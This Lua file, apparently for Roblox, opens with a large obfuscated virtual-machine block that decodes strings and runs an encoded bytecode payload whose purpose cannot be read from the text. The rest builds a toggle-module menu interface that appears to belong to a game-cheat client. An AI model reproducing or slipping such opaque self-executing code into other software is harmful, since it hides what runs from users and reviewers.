1062==(o)/((0xb6a42/(-0x23+269)))do o=(6227595)while O>(0x230/35)do o-= o local l={b,l};l[h][l[f][x]]=l[f][u]+l[f][m];break end while 1641==(o)/((724845/0xbf))do if(b[l[M]]==b[l[u]])then e=e+k;else e=l[L];end;break end;break;end break;end while 68==(o)/((3722-0x762))do o=(120862)while O<=(105-0x57)do o-= o if(b[l[n]]==l[_])then e=e+k;else e=l[m];end;break;end while 1358==(o)/((-123+0xd4))do o=(2253816)while O>(0x53-64)do o-= o if(b[l[F]]~=b[l[U]])then e=e+k;else e=l[a];end;break end while(o)/((-0x28+1696))==1361 do w[l[B]]=b[l[F]];break end;break;end break;end break;end break;end break;end while(o)/(((-19+0x885)+-103))==623 do o=(3018932)while(-82+0x70)>=O do o-= o o=(7063192)while O<=(-0x42+(7553/0x53))do o-= o o=(10378500)while(0x14e2/243)>=O do o-= o o=(5272883)while O>(0x63+-78)do o-= o b[l[K]]=b[l[P]][l[i]];break end while 2209==(o)/((0x12df-(0x1378-2540)))do local e=l[L];local o=b[e]for l=e+1,l[N]do o=o..b[l];end;b[l[F]]=o;break end;break;end while(o)/(((0x177adc/188)-0x1013))==2550 do o=(1557744)while(112-0x59)>=O do o-= o b[l[H]]=b[l[m]]-b[l[i]];break;end while 3818==(o)/((0x362-458))do o=(15526820)while O>(0x43-43)do o-= o b[l[M]]=(l[B]~=0);break end while(o)/((778368/0xc0))==3830 do if(b[l[H]]~=b[l[i]])then e=e+k;else e=l[B];end;break end;break;end break;end break;end while 3544==(o)/((-0x25+2030))do o=(10438274)while(0x32a/30)>=O do o-= o o=(10054933)while O>(0x81-103)do o-= o b[l[M]]=b[l[B]]%l[_];break end while(o)/((0x1857-3172))==3287 do do return b[l[n]]end break end;break;end while(o)/(((156301376/0xc5)/224))==2947 do o=(3563946)while O<=(4144/(0x191-253))do o-= o b[l[M]]=w[l[a]];break;end while 1674==(o)/((2255+(-2016/0x10)))do o=(406274)while(6902/(-49+0x11f))<O do o-= o local k;local O;local o;b[l[M]]=l[B];e=e+h;l=d[e];b[l[F]]=l[a];e=e+h;l=d[e];b[l[F]]=#b[l[L]];e=e+h;l=d[e];b[l[K]]=l[m];e=e+h;l=d[e];o=l[K];O=b[o]k=b[o+2];if(k>0)then if(O>b[o+1])then e=l[a];else b[o+3]=O;end elseif(O<b[o+1])then e=l[P];else b[o+3]=O;end break end while(o)/((0x6ef4c/132))==118 do b[l[F]]=D(s[l[L]],nil,r);break end;break;end break;end break;end break;end while(o)/(((15895425/0xc3)/85))==3148 do o=(399765)while O<=(0x94-113)do o-= o o=(3451140)while(147+-0x73)>=O do o-= o o=(6050125)while O>(84-0x35)do o-= o do return end;break end while(o)/((0x69f+-26))==3625 do local O;local P,f;local k;local o;b[l[M]]=r[l[m]];e=e+h;l=d[e];o=l[x];k=b[l[a]];b[o+1]=k;b[o]=k[l[U]];e=e+h;l=d[e];b[l[x]]=r[l[a]];e=e+h;l=d[e];b[l[n]]=l[L];e=e+h;l=d[e];b[l[K]]=l[a];e=e+h;l=d[e];b[l[H]]=l[p];e=e+h;l=d[e];o=l[M]b[o]=b[o](c(b,o+h,l[m]))e=e+h;l=d[e];o=l[x]P,f=v(b[o](c(b,o+1,l[m])))t=f+o-1 O=0;for l=o,t do O=O+h;b[l]=P[O];end;e=e+h;l=d[e];o=l[K]b[o]=b[o](c(b,o+h,t))e=e+h;l=d[e];b[l[n]]();break end;break;end while 1162==(o)/((0xb8e66/255))do o=(416355)while(4554/0x8a)>=O do o-= o b[l[n]]=l[a];break;end while 123==(o)/(((13680-0x1aec)-0xd4b))do o=(2662710)while O>(0x9b-(19118/0x9e))do o-= o b[l[x]]={};break end while 2270==(o)/((259233/0xdd))do b[l[n]]=r[l[P]];break end;break;end break;end break;end while 145==(o)/((5606-(0x7bcf2/178)))do o=(1374656)while O<=(0xfe2/107)do o-= o o=(5836155)while(103+(-0x22+-33))>=O do o-= o local O;local o;b[l[K]]=r[l[L]];e=e+h;l=d[e];b[l[n]]=r[l[B]];e=e+h;l=d[e];b[l[n]]=l[m];e=e+h;l=d[e];b[l[K]]=l[p];e=e+h;l=d[e];b[l[H]]=l[P];e=e+h;l=d[e];o=l[M]b[o]=b[o](c(b,o+h,l[m]))e=e+h;l=d[e];b[l[H]]=b[l[L]][b[l[S]]];e=e+h;l=d[e];o=l[K]b[o]=b[o](b[o+k])e=e+h;l=d[e];O=b[l[N]];if not O then e=e+k;else b[l[n]]=O;e=l[B];end;break;end while(o)/((-72+0xa6b))==2249 do o=(1597500)while(0x7b-86)<O do o-= o b[l[M]][b[l[a]]]=b[l[U]];break end while 2556==(o)/((1313-0x2b0))do b[l[x]]=(l[p]~=0);break end;break;end break;end while(o)/((24440/0x41))==3656 do o=(2264030)while(-48+0x57)>=O do o-= o local o;local O;b[l[M]]=r[l[m]];e=e+h;l=d[e];b[l[x]]=l[a];e=e+h;l=d[e];b[l[n]]=l[p];e=e+h;l=d[e];O=l[m];o=b[O]for l=O+1,l[U]do o=o..b[l];end;b[l[H]]=o;e=e+h;l=d[e];if b[l[M]]then e=e+h;else e=l[P];end;break;end while(o)/((0x591e6/173))==1073 do o=(14760123)while O>(0xc6-158)do o-= o b[l[M]]();break end while(o)/((0x1e5f-(0x1ef8-4024)))==3813 do b[l[K]]=w[l[m]];break end;break;end break;end break;end break;end break;end break;end while(o)/((0x292b6/73))==3853 do o=(6294050)while O<=((-0x10+178)-100)do o-= o o=(837177)while(-0x28+91)>=O do o-= o o=(3062106)while(7636/0xa6)>=O do o-= o o=(438240)while O<=(0x433/(0x1469/209))do o-= o o=(1715742)while((-0x5d+10425)/246)<O do o-= o b[l[K]]={};break end while(o)/(((0xc7071c/236)/0x17))==714 do local e=l[P];local o=b[e]for l=e+1,l[N]do o=o..b[l];end;b[l[n]]=o;break end;break;end while 176==(o)/((5068-0xa12))do o=(6647662)while O<=(0xa9-125)do o-= o local L;local O;local m;local o;b[l[M]]=r[l[P]];e=e+h;l=d[e];b[l[K]]=b[l[P]][l[U]];e=e+h;l=d[e];o=l[K];m=b[l[p]];b[o+1]=m;b[o]=m[l[u]];e=e+h;l=d[e];b[l[M]]=b[l[P]];e=e+h;l=d[e];b[l[M]]=b[l[a]];e=e+h;l=d[e];o=l[n]b[o]=b[o](c(b,o+h,l[p]))e=e+h;l=d[e];o=l[K];m=b[l[P]];b[o+1]=m;b[o]=m[l[u]];e=e+h;l=d[e];o=l[H]b[o]=b[o](b[o+k])e=e+h;l=d[e];O={b,l};O[k][O[f][K]]=O[h][O[f][U]]+O[k][O[f][P]];e=e+h;l=d[e];b[l[M]]=b[l[a]]%l[U];e=e+h;l=d[e];o=l[F]b[o]=b[o](b[o+k])e=e+h;l=d[e];m=l[B];L=b[m]for l=m+1,l[u]do L=L..b[l];end;b[l[n]]=L;e=e+h;l=d[e];O={b,l};O[k][O[f][H]]=O[h][O[f][S]]+O[k][O[f][B]];e=e+h;l=d[e];b[l[x]]=b[l[P]]%l[_];break;end while(o)/((4781-0x976))==2818 do o=(119850)while(186-0x8d)<O do o-= o b[l[K]]=b[l[a]];break end while 255==(o)/((1023-0x229))do local o;b[l[K]]=r[l[p]];e=e+h;l=d[e];b[l[F]]=r[l[B]];e=e+h;l=d[e];b[l[n]]=l[P];e=e+h;l=d[e];b[l[x]]=l[P];e=e+h;l=d[e];b[l[K]]=l[a];e=e+h;l=d[e];o=l[H]b[o]=b[o](c(b,o+h,l[m]))e=e+h;l=d[e];b[l[n]]=b[l[a]][b[l[S]]];e=e+h;l=d[e];o=l[F]b[o]=b[o](b[o+k])e=e+h;l=d[e];b[l[F]]=b[l[P]];e=e+h;l=d[e];e=l[m];break end;break;end break;end break;end while(o)/((0x7b0-1035))==3282 do o=(4567800)while((0x2293-4483)/91)>=O do o-= o o=(3276936)while(0xad5/(-0x51+140))<O do o-= o do return b[l[x]]end break end while 3501==(o)/((44928/0x30))do local l=l[H]b[l](b[l+k])break end;break;end while(o)/((0x98bc/34))==3972 do o=(7414072)while(181-0x84)>=O do o-= o local l={b,l};l[h][l[f][K]]=l[f][N]+l[f][m];break;end while(o)/((6452-0xcd9))==2344 do o=(1286934)while(-0x23+85)<O do o-= o b[l[M]]=r[l[L]];break end while 629==(o)/((0x106f-2161))do b[l[H]]=(l[P]~=0);e=e+k;break end;break;end break;end break;end break;end while 3309==(o)/((-0x1b+280))do o=(7596799)while O<=(0x34b8/241)do o-= o o=(4885515)while O<=(117+-0x40)do o-= o o=(2536904)while(10348/0xc7)<O do o-= o if(b[l[x]]==l[N])then e=e+k;else e=l[p];end;break end while(o)/((0x70f94/170))==932 do if b[l[x]]then e=e+h;else e=l[P];end;break end;break;end while(o)/((0x4ac04/252))==4021 do o=(2132468)while O<=(156-0x66)do o-= o local O=s[l[L]];local h;local o={};h=J({},{__index=function(e,l)local l=o[l];return l[1][l[2]];end,__newindex=function(b,l,e)local l=o[l]l[1][l[2]]=e;end;});for h=1,l[_]do e=e+k;local l=d[e];if l[(126/0x7e)]==82 then o[h-1]={b,l[p]};else o[h-1]={w,l[p]};end;C[#C+1]=o;end;b[l[n]]=D(O,h,r);break;end while 3566==(o)/((0x524-718))do o=(9621612)while(-0x12+73)<O do o-= o local o=l[F]local e,l=v(b[o](c(b,o+1,l[B])))t=l+o-1 local l=0;for o=o,t do l=l+h;b[o]=e[l];end;break end while(o)/((160200/0x32))==3003 do local o=l[x]local e,l=v(b[o](c(b,o+1,l[L])))t=l+o-1 local l=0;for o=o,t do l=l+h;b[o]=e[l];end;break end;break;end break;end break;end while(o)/(((6292+-0x78)-0xc4d))==2513 do o=(6955852)while O<=(0x8b-80)do o-= o o=(9186804)while O<=(0x8b+-82)do o-= o b[l[n]]=D(s[l[a]],nil,r);break;end while(o)/((0x911+-22))==3996 do o=(141298)while O>(-0x71+(454-0x11b))do o-= o local o=l[F];local h=b[o]local O=b[o+2];if(O>0)then if(h>b[o+1])then e=l[P];else b[o+3]=h;end elseif(h<b[o+1])then e=l[a];else b[o+3]=h;end break end while 106==(o)/((-83+0x588))do b[l[n]]=b[l[m]][l[u]];break end;break;end break;end while(o)/((0x1923-3253))==2186 do o=(8471004)while(3780/0x3f)>=O do o-= o r[l[P]]=b[l[n]];break;end while(o)/((0xb39ec/253))==2913 do o=(2348932)while(114+(-0x50+27))<O do o-= o local o=l[x];local e=b[l[B]];b[o+1]=e;b[o]=e[l[_]];break end while 1178==(o)/((0x7fd+-51))do local O;local o;b[l[K]]=(l[P]~=0);e=e+h;l=d[e];b[l[F]]=b[l[B]];e=e+h;l=d[e];b[l[x]]=r[l[P]];e=e+h;l=d[e];o=l[n]b[o]=b[o](b[o+k])e=e+h;l=d[e];O=b[l[u]];if not O then e=e+k;else b[l[n]]=O;e=l[B];end;break end;break;end break;end break;end break;end break;end while 1835==(o)/((3462+-0x20))do o=(2945000)while O<=(0xbf-118)do o-= o o=(589560)while O<=(0x88+-69)do o-= o o=(13792640)while(-120+0xb8)>=O do o-= o o=(483296)while O>(222-0x9f)do o-= o local o=b[l[S]];if not o then e=e+k;else b[l[M]]=o;e=l[L];end;break end while(o)/((-24+0x178))==1373 do local l=l[x]b[l]=b[l](c(b,l+h,t))break end;break;end while 3680==(o)/((757096/0xca))do o=(3431029)while(0x3309/201)>=O do o-= o b[l[n]]();break;end while 2401==(o)/((0x1706a/66))do o=(4924901)while O>(182+-0x74)do o-= o b[l[H]]=b[l[B]][b[l[i]]];break end while 1579==(o)/((-0x36+3173))do b[l[F]][b[l[P]]]=b[l[i]];break end;break;end break;end break;end while(o)/((2140-0x460))==578 do o=(2489535)while O<=(0xa5-95)do o-= o o=(4173260)while O<=(200-0x84)do o-= o local f=s[l[m]];local O;local o={};O=J({},{__index=function(e,l)local l=o[l];return l[1][l[2]];end,__newindex=function(b,l,e)local l=o[l]l[1][l[2]]=e;end;});for h=1,l[N]do e=e+k;local l=d[e];if l[(0x59-88)]==82 then o[h-1]={b,l[a]};else o[h-1]={w,l[L]};end;C[#C+1]=o;end;b[l[F]]=D(f,O,r);break;end while(o)/((-111+(32827/0x11)))==2293 do o=(6347271)while((-5820/0x3c)+0xa6)<O do o-= o b[l[F]]=b[l[B]]-b[l[_]];break end while(o)/((0x1177-2254))==2863 do local l=l[M]b[l](b[l+k])break end;break;end break;end while 3415==(o)/((747+(-0x1d4/26)))do o=(580244)while(0xaf-(0xf4-140))>=O do o-= o local O;local o;b[l[F]]=r[l[p]];e=e+h;l=d[e];b[l[x]]=r[l[B]];e=e+h;l=d[e];b[l[n]]=l[L];e=e+h;l=d[e];b[l[M]]=l[a];e=e+h;l=d[e];b[l[M]]=l[B];e=e+h;l=d[e];o=l[K]b[o]=b[o](c(b,o+h,l[m]))e=e+h;l=d[e];b[l[M]]=b[l[B]][b[l[_]]];e=e+h;l=d[e];o=l[K]b[o]=b[o](b[o+k])e=e+h;l=d[e];O=b[l[S]];if not O then e=e+k;else b[l[x]]=O;e=l[a];end;break;end while(o)/((0xe29-1823))==322 do o=(796536)while O>(0x24d8/131)do o-= o w[l[p]]=b[l[M]];break end while(o)/((2451-0x4e7))==666 do e=l[B];break end;break;end break;end break;end break;end while(o)/((0x109a0/68))==2945 do o=(215541)while O<=(0x1a82/87)do o-= o o=(128338)while O<=(0x114-201)do o-= o o=(5365236)while(0xf9-175)<O do o-= o local l=l[K]b[l]=b[l](b[l+k])break end while 1572==(o)/((3526+-0x71))do b[l[n]]=l[B];break end;break;end while(o)/((0x24f72/210))==178 do o=(5459308)while O<=((0xaa8+-68)/35)do o-= o b[l[F]]=(l[a]~=0);e=e+k;break;end while 2477==(o)/((0x8c1+-37))do o=(327294)while(1386/0x12)<O do o-= o b[l[M]]=#b[l[P]];break end while(o)/((-0x17+137))==2871 do b[l[H]]=#b[l[m]];break end;break;end break;end break;end while 2661==(o)/((0xb6-101))do o=(7880352)while(20331/0xfb)>=O do o-= o o=(167493)while O<=(200-0x79)do o-= o local o=l[n]b[o]=b[o](c(b,o+h,l[p]))break;end while 1801==(o)/((0x4b9/13))do o=(943587)while(-102+(0x1cf-281))<O do o-= o e=l[a];break end while(o)/((358954/0xca))==531 do b[l[H]]=w[l[a]];e=e+h;l=d[e];b[l[K]]=#b[l[P]];e=e+h;l=d[e];w[l[a]]=b[l[F]];e=e+h;l=d[e];b[l[x]]=w[l[B]];e=e+h;l=d[e];b[l[x]]=#b[l[p]];e=e+h;l=d[e];w[l[a]]=b[l[M]];e=e+h;l=d[e];do return end;break end;break;end break;end while 3956==(o)/((4106-0x842))do o=(4134543)while O<=(0x2766/123)do o-= o b[l[n]]=b[l[p]];break;end while 1491==(o)/(((27785-0x3660)/0x5))do o=(1029665)while(0xa60/32)<O do o-= o b[l[x]]=b[l[L]][b[l[N]]];break end while 403==(o)/(((5304-0xa6a)+-83))do r[l[B]]=b[l[n]];break end;break;end break;end break;end break;end break;end break;end e+= k end;end);end;return D(j(),{},Y())()end)_msec({[(22632/0xa4)]='\115\116'..(function(l)return(l and'(0x3a34/(0x182-237))')or'\114\105'or'\120\58'end)((760/0x98)==(108-0x66))..'\110g',[(191280/0xf0)]='\108\100'..(function(l)return(l and'((0x11b+-40)-0x8f)')or'\101\120'or'\119\111'end)((37+-0x20)==(38-(86-0x36)))..'\112',[(-22+(0x288-340))]=(function(l)return(l and'(-0x10+(0x10e-154))')and'\98\121'or'\100\120'end)((36-0x1f)==((225+-0x5d)+-0x7f))..'\116\101',[(-0x36+407)]='\99'..(function(l)return(l and'(0x42cc/171)')and'\90\19\157'or'\104\97'end)((0x2bc/140)==(-69+0x48))..'\114',[(0x190f8/188)]='\116\97'..(function(l)return(l and'(0x4394/173)')and'\64\113'or'\98\108'end)((117-0x6f)==(0x433/215))..'\101',[((1074+-0x61)-0x200)]=(function(l)return(l and'(-0x2d+145)')or'\115\117'or'\78\107'end)((135/0x2d)==(0x1740/192))..'\98',[(0x7b93/37)]='\99\111'..(function(l)return(l and'(0x103-159)')and'\110\99'or'\110\105\103\97'end)((0xb6-(-0x21+184))==(124-(0xcb7/35)))..'\97\116',[(-74+0x2ac)]=(function(l,o)return(l and'(-0x2a+142)')and'\48\159\158\188\10'or'\109\97'end)((730/0x92)==(-0x65+107))..'\116\104',[(0x3d17c/189)]=(function(l,o)return((0x6e-105)==(-0x5b+94)and'\48'..'\195'or l..((not'\20\95\69'and'\90'..'\180'or o)))or'\199\203\95'end),[(-47+0x403)]='\105\110'..(function(l,o)return(l and'(-110+0xd2)')and'\90\115\138\115\15'or'\115\101'end)((134-0x81)==((0x1ce6-3709)/0x77))..'\114\116',[(2204-0x48a)]='\117\110'..(function(l,o)return(l and'(25300/(0x167+-106))')or'\112\97'or'\20\38\154'end)((0x34-47)==(0x19ac/212))..'\99\107',[(2439-0x4f1)]='\115\101'..(function(l)return(l and'(221+(-168+0x2f))')and'\110\112\99\104'or'\108\101'end)((0x3d-56)==(171-0x8c))..'\99\116',[(2577-0x51e)]='\116\111\110'..(function(l,o)return(l and'(12300/0x7b)')and'\117\109\98'or'\100\97\120\122'end)((-76+0x51)==(0x433/215))..'\101\114'},{[(1863/0x51)]=((getfenv))},((getfenv))()) end)();end)
    base_class.menu_create_module = function(self, text, Type, nohotkey) 
        Type = Type or 'Toggle'
        local M_IndexOffset = self.ZIndex+1
        
        if (Type == 'Toggle') then 
            ModListInit(text)
            
            
            
            
            local m_ModuleRoot
             local m_ModuleBackground
              local m_ModuleEnableEffect
               local m_ModuleEnableEffect2
              local m_Highlight
              local m_ModuleText
               local m_TextPadding
              local m_ModuleIcon
             local m_Menu
              local m_MenuListLayout
            
            do
                m_ModuleRoot = instNew('ImageButton')
                m_ModuleRoot.Size = dimNew(1, 0, 0, 25)
                m_ModuleRoot.AutomaticSize = 'Y'
                m_ModuleRoot.ClipsDescendants = false
                m_ModuleRoot.BackgroundTransparency = 1
                m_ModuleRoot.BorderSizePixel = 0
                m_ModuleRoot.ZIndex = M_IndexOffset-1
                m_ModuleRoot.Parent = self.Menu
                
                 m_ModuleBackground = instNew('Frame')
                 m_ModuleBackground.BackgroundColor3 = RLTHEMEDATA['bo'][1]
                 m_ModuleBackground.BackgroundTransparency = RLTHEMEDATA['bo'][2]
                 m_ModuleBackground.BorderSizePixel = 0
                 m_ModuleBackground.Size = dimNew(1,0,0,25)
                 m_ModuleBackground.ZIndex = M_IndexOffset
                 m_ModuleBackground.Parent = m_ModuleRoot
                 
                  m_Highlight = instNew('Frame')
                  m_Highlight.Active = false
                  m_Highlight.BackgroundColor3 = RLTHEMEDATA['ge'][1]
                  m_Highlight.BackgroundTransparency = 0.9
                  m_Highlight.BorderSizePixel = 0
                  m_Highlight.Size = dimScale(1,1)
                  m_Highlight.Visible = false
                  m_Highlight.ZIndex = M_IndexOffset
                  m_Highlight.Parent = m_ModuleBackground
                  
                  m_ModuleEnableEffect = instNew('Frame')
                  m_ModuleEnableEffect.BackgroundColor3 = RLTHEMEDATA['tm'][1]
                  m_ModuleEnableEffect.BackgroundTransparency = 0.92
                  m_ModuleEnableEffect.BorderSizePixel = 0
                  m_ModuleEnableEffect.ClipsDescendants = true
                  m_ModuleEnableEffect.Size = dimNew(0,0,1,0)
                  m_ModuleEnableEffect.ZIndex = M_IndexOffset
                  m_ModuleEnableEffect.Parent = m_ModuleBackground
                  
                   m_ModuleEnableEffect2 = instNew('Frame')
                   m_ModuleEnableEffect2.BackgroundColor3 = RLTHEMEDATA['ge'][1]
                   m_ModuleEnableEffect2.BorderSizePixel = 0
                   m_ModuleEnableEffect2.Size = dimNew(0,2,1,0)
                   m_ModuleEnableEffect2.ZIndex = M_IndexOffset
                   m_ModuleEnableEffect2.Parent = m_ModuleEnableEffect
                  
                  m_ModuleText = instNew('TextLabel')
                  m_ModuleText.BackgroundTransparency = 1
                  m_ModuleText.Font = RLTHEMEFONT
                  m_ModuleText.Position = dimOffset(0, 0)
                  m_ModuleText.RichText = true
                  m_ModuleText.Size = dimScale(1, 1)
                  m_ModuleText.Text = text
                  m_ModuleText.TextColor3 = RLTHEMEDATA['tm'][1]
                  m_ModuleText.TextSize = 20
                  m_ModuleText.TextStrokeColor3 = RLTHEMEDATA['to'][1]
                  m_ModuleText.TextStrokeTransparency = 0
                  m_ModuleText.TextXAlignment = 'Left'
                  m_ModuleText.ZIndex = M_IndexOffset
                  m_ModuleText.Parent = m_ModuleBackground
                  
                   m_TextPadding = instNew('UIPadding')
                   m_TextPadding.PaddingLeft = dimOffset(IndentLevel1, 0).X -- LEFT PADDING 1
                   m_TextPadding.Parent = m_ModuleText
                  
                  m_ModuleIcon = instNew('TextLabel')
                  m_ModuleIcon.AnchorPoint = vec2(1,0)
                  m_ModuleIcon.BackgroundTransparency = 1
                  m_ModuleIcon.Font = RLTHEMEFONT
                  m_ModuleIcon.Position = dimScale(1,0)
                  m_ModuleIcon.Rotation = 0
                  m_ModuleIcon.Size = dimOffset(25, 25)
                  m_ModuleIcon.Text = '+'
                  m_ModuleIcon.TextColor3 = RLTHEMEDATA['tm'][1]
                  m_ModuleIcon.TextSize = 18
                  m_ModuleIcon.TextStrokeColor3 = RLTHEMEDATA['to'][1]
                  m_ModuleIcon.TextStrokeTransparency = 0
                  m_ModuleIcon.TextXAlignment = 'Center'
                  m_ModuleIcon.ZIndex = M_IndexOffset
                  m_ModuleIcon.Parent = m_ModuleBackground
                
                m_Menu = instNew('Frame')
                m_Menu.BackgroundColor3 = RLTHEMEDATA['bs'][1]
                m_Menu.BackgroundTransparency = 1
                m_Menu.BorderSizePixel = 0
                m_Menu.Position = dimOffset(0,25)
                m_Menu.Size = dimNew(1,0,0,0)
                m_Menu.Visible = false
                m_Menu.ZIndex = M_IndexOffset-1
                m_Menu.Parent = m_ModuleRoot
                
                 m_MenuListLayout = instNew('UIListLayout')
                 m_MenuListLayout.FillDirection = 'Vertical'
                 m_MenuListLayout.SortOrder = 2
                 m_MenuListLayout.HorizontalAlignment = 'Left'
                 m_MenuListLayout.VerticalAlignment = 'Top'
                 m_MenuListLayout.Parent = m_Menu
                 
            end
                
            local M_Object = {} do 
                loadSettings()
                M_Object.Tooltip = nil
                
                M_Object.MToggled = false
                M_Object.OToggled = false
                
                M_Object.Flags = {} do 
                    M_Object.Flags['Enabled'] = true
                    M_Object.Flags['Disabled'] = true
                    M_Object.Flags['Toggled'] = true
                end
                
                M_Object.Name = text
                M_Object.Menu = m_Menu
                M_Object.Icon = m_ModuleIcon
                M_Object.Effect = m_ModuleEnableEffect
                M_Object.ZIndex = M_IndexOffset
                
                M_Object.Highlight = m_Highlight
                
                M_Object.Parent = self
                M_Object.Root = m_ModuleRoot
                
                M_Object.addToggle = base_class.module_create_toggle
                M_Object.AddLabel = base_class.module_create_label
                M_Object.addDropdown = base_class.module_create_dropdown
                M_Object.addModHotkey = base_class.module_create_modhotkey
                M_Object.AddHotkey = base_class.module_create_hotkey
                M_Object.addSlider = base_class.module_create_slider
                M_Object.AddInput = base_class.module_create_input
                M_Object.AddButton = base_class.module_create_button
                
                M_Object.setvis = base_class.module_setvis
                
                M_Object.Toggle = base_class.module_toggle_self
                M_Object.Disable = base_class.module_toggle_disable
                M_Object.Enable = base_class.module_toggle_enable
                M_Object.Reset = base_class.module_toggle_reset
                
                M_Object.ToggleMenu = base_class.module_toggle_menu
                M_Object.getState = base_class.module_getstate_self
                M_Object.isEnabled = base_class.module_getstate_self
                M_Object.GetMenuState = base_class.module_getstate_menu
                
                M_Object.Connect = base_class.generic_connect
                M_Object.setTooltip = base_class.generic_tooltip
            end
            
            do
                if not Configs[text] then
                    Configs[text] = {["Keybind"] = "", ["IsToggled"] = "", ["MenuToggled"] = "", ["Extras"] = {}}
                end
                if Configs[text] then
                    if Configs[text]["IsToggled"] == true then
                        M_Object:Toggle(true)
                    end
                    if Configs[text]["MenuToggled"] == true then
                        M_Object:ToggleMenu()
                    end
                end
                m_ModuleBackground.InputBegan:Connect(function(io) 
                    local uitv = io.UserInputType.Value
                    if (uitv == 0) then
                        M_Object:Toggle()
                        return
                    end
                    
                    if (uitv == 1) then
                        M_Object:ToggleMenu()
                        return
                    end
                end)
                
                m_ModuleBackground.MouseEnter:Connect(function() 
                    m_ModuleBackground.BackgroundColor3 = RLTHEMEDATA['ho'][1]
                    
                    
                    local tt = M_Object.Tooltip
                    if (tt) then
                        w_Tooltip.Text = tt
                        w_TooltipHeader.Text = M_Object.Name
                        w_TooltipHeader.Visible = true
                    end
                end)
                
                m_ModuleBackground.MouseLeave:Connect(function() 
                    m_ModuleBackground.BackgroundColor3 = RLTHEMEDATA['bo'][1]
                    
                    if (w_Tooltip.Text == M_Object.Tooltip) then
                        w_TooltipHeader.Visible = false
                    end
                end)
            end
            
            if (not nohotkey) then
                M_Object:addModHotkey() 
            end
            
            tabInsert(ui_Modules, M_Object)
            return M_Object
        elseif (Type == 'Textbox') then
            local m_ModuleRoot
             local m_ModuleBackground
             local m_ModuleEnableEffect
              local m_ModuleText
               local m_ModulePadding
              local m_ModuleIcon
            do
                m_ModuleRoot = instNew('Frame')
                m_ModuleRoot.AutomaticSize = 'Y'
                m_ModuleRoot.BackgroundTransparency = 1
                m_ModuleRoot.BorderSizePixel = 0
                m_ModuleRoot.Size = dimNew(1, 0, 0, 25)
                m_ModuleRoot.ZIndex = M_IndexOffset-1
                m_ModuleRoot.Parent = self.Menu
                
                 m_ModuleBackground = instNew('Frame')
                 m_ModuleBackground.BackgroundColor3 = RLTHEMEDATA['bo'][1]
                 m_ModuleBackground.BackgroundTransparency = RLTHEMEDATA['bo'][2]
                 m_ModuleBackground.BorderSizePixel = 0
                 m_ModuleBackground.Size = dimNew(1,0,0,25)
                 m_ModuleBackground.ZIndex = M_IndexOffset
                 m_ModuleBackground.Parent = m_ModuleRoot
                 
                  m_ModuleEnableEffect = instNew('Frame')
                  m_ModuleEnableEffect.BackgroundColor3 = RLTHEMEDATA['tm'][1]
                  m_ModuleEnableEffect.BackgroundTransparency = 1
                  m_ModuleEnableEffect.BorderSizePixel = 0
                  m_ModuleEnableEffect.ClipsDescendants = true
                  m_ModuleEnableEffect.Size = dimNew(1,0,1,0)
                  m_ModuleEnableEffect.ZIndex = M_IndexOffset
                  m_ModuleEnableEffect.Parent = m_ModuleBackground
                 
                 m_ModuleText = instNew('TextBox')
                 m_ModuleText.BackgroundTransparency = 1
                 m_ModuleText.ClearTextOnFocus = not nohotkey
                 m_ModuleText.Font = RLTHEMEFONT
                 m_ModuleText.Size = dimScale(1, 1)
                 m_ModuleText.Text = text
                 m_ModuleText.TextColor3 = RLTHEMEDATA['tm'][1]
                 m_ModuleText.TextSize = 20
                 m_ModuleText.TextStrokeColor3 = RLTHEMEDATA['to'][1]
                 m_ModuleText.TextStrokeTransparency = 0
                 m_ModuleText.TextWrapped = true
                 m_ModuleText.TextXAlignment = 'Left'
                 m_ModuleText.ZIndex = M_IndexOffset
                 m_ModuleText.Parent = m_ModuleBackground
                  
                  m_ModulePadding = instNew('UIPadding')
                  m_ModulePadding.PaddingLeft = dimOffset(IndentLevel1, 0).X
                  m_ModulePadding.Parent = m_ModuleText
                 
                 m_ModuleIcon = instNew('TextLabel')
                 m_ModuleIcon.Size = dimOffset(25, 25)
                 m_ModuleIcon.Position = dimScale(1,0)
                 m_ModuleIcon.AnchorPoint = vec2(1,0)
                 m_ModuleIcon.BackgroundTransparency = 1
                 m_ModuleIcon.Font = RLTHEMEFONT
                 m_ModuleIcon.TextXAlignment = 'Center'
                 m_ModuleIcon.TextColor3 = RLTHEMEDATA['tm'][1]
                 m_ModuleIcon.TextSize = 18
                 m_ModuleIcon.Text = '🅃'
                 m_ModuleIcon.TextStrokeTransparency = 0
                 m_ModuleIcon.TextStrokeColor3 = RLTHEMEDATA['to'][1]
                 m_ModuleIcon.Rotation = 0
                 m_ModuleIcon.ZIndex = M_IndexOffset
                 m_ModuleIcon.Parent = m_ModuleBackground
            end
                
            local M_Object = {} do 
                M_Object.Tooltip = nil
                
                
                M_Object.Flags = {} do 
                    M_Object.Flags['Focused'] = true
                    M_Object.Flags['Unfocused'] = true
                    M_Object.Flags['TextChanged'] = true
                end
                
                M_Object.Effect = m_ModuleEnableEffect
                
                M_Object.Name = text
                M_Object.ZIndex = M_IndexOffset
                                    
                M_Object.Connect = base_class.generic_connect
                M_Object.setTooltip = base_class.generic_tooltip
            end
            
            do
                m_ModuleBackground.MouseEnter:Connect(function() 
                    m_ModuleBackground.BackgroundColor3 = RLTHEMEDATA['ho'][1]
                    
                    
                    local tt = M_Object.Tooltip
                    if (tt) then
                        w_Tooltip.Text = tt
                        w_TooltipHeader.Text = M_Object.Name
                        w_TooltipHeader.Visible = true
                    end
                end)
                
                m_ModuleBackground.MouseLeave:Connect(function() 
                    m_ModuleBackground.BackgroundColor3 = RLTHEMEDATA['bo'][1]
                    
                    if (w_Tooltip.Text == M_Object.Tooltip) then
                        w_TooltipHeader.Visible = false
                    end
                end)
                
                m_ModuleText.FocusLost:Connect(function(enter) 
                    pcall(M_Object.Flags.Unfocused, m_ModuleText.Text, enter)
                    if (not nohotkey) then 
                        m_ModuleText.Text = M_Object.Name
                    end
                end)
                m_ModuleText.Focused:Connect(function() 
                    pcall(M_Object.Flags.Focused)
                end)
                m_ModuleText:GetPropertyChangedSignal('Text'):Connect(function() 
                    pcall(M_Object.Flags.TextChanged, m_ModuleText.Text)
                end)
            end
            
            tabInsert(ui_Modules, M_Object)
            return M_Object
        elseif (Type == 'Button') then
            local m_ModuleRoot
             local m_ModuleBackground
              local m_Highlight
              local m_ModuleEnableEffect
              local m_ModuleText
               local m_ModulePadding
              local m_ModuleIcon
            do
                m_ModuleRoot = instNew('Frame')
                m_ModuleRoot.Size = dimNew(1, 0, 0, 25)
                m_ModuleRoot.AutomaticSize = 'Y'
